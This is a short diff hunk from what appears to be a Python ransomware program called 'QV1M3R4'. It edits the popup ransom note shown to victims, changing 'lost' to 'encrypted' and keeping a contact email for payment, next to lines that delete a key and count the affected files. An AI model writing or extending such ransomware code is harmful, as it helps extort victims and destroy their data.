@@ -71,7 +71,7 @@ del node_key
 gc.collect()
 
 messagebox.showwarning(title="Hello",
-message="""QV1M3R4 has visited you, {0} file(s) are now lost!
+message="""QV1M3R4 has visited you, {0} file(s) are now encrypted!
 
 Send a message to our@email.com to get in touch.
 """.format(len(tool.files_found)))
